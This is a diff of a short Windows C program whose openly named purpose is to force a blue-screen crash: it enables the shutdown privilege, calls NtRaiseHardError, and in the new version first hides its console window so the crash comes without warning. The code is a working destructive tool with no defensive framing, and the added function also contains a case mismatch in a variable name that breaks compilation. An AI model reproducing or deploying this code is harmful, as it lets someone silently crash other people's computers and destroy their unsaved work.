@@ -1,35 +1,32 @@
 #include <Windows.h>
 #include <winternl.h>
 
-typedef NTSTATUS
-(NTAPI* pdef_RtlAdjustPrivilege)
-(ULONG Privilege,
-    BOOLEAN Enable,
-    BOOLEAN CurrentThread,
-    PBOOLEAN Enabled);
-typedef NTSTATUS
-(NTAPI* pdef_NtRaiseHardError)
-(NTSTATUS ErrorStatus,
-    ULONG NumberOfParameters,
-    ULONG UnicodeStringParameterMask OPTIONAL,
-    PULONG_PTR Parameters,
-    ULONG ResponseOption,
-    PULONG Response);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 
-void TriggerHardBsod()
+HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
+pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+
+NTSTATUS Set_Privilege(ULONG perm, BOOLEAN enable, BOOLEAN current_thread)
 {
-    BOOLEAN bEnabled;
-    ULONG uResp;
-    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
-    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
-    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;
-    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
-    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+    BOOLEAN enabled;
+    return RtlAdjustPrivilege(perm, enable, current_thread, &enabled);
 }
 
-int main()
+NTSTATUS Trigger_BSOD(NTSTATUS Error_Code)
 {
-    TriggerHardBsod();
+    ULONG response;
+    return NtRaiseHardError(Error_code, 0, 0, 0, 6, &response);
+}
+
+VOID main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS)
+    {
+       Trigger_BSOD(0xC0000350);
+    }
+    FreeLibrary(ntdll);
     ExitProcess(1);
 }
